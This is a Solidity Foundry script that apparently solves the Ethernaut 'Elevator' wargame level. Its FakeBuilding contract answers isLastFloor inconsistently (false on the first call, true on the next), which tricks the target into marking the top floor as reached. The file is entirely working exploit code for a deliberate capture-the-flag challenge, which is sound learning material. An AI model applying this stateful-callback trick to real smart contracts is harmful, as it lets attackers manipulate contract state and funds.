// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address payable elevator = payable(vm.envAddress("ELEVATOR_INSTANCE"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        FakeBuilding building = new FakeBuilding();
        building.exp(elevator);

        vm.stopBroadcast();
    }
}

contract FakeBuilding {
    uint256 called_count;

    function exp(address elevator) external {
        elevator.call(abi.encodeWithSignature("goTo(uint256)", 1337));
    }

    function isLastFloor(uint256) external returns (bool) {
        ++called_count;
        
        if (called_count % 2 == 1) {
            return false;
        } else {
            return true;
        }
    }
}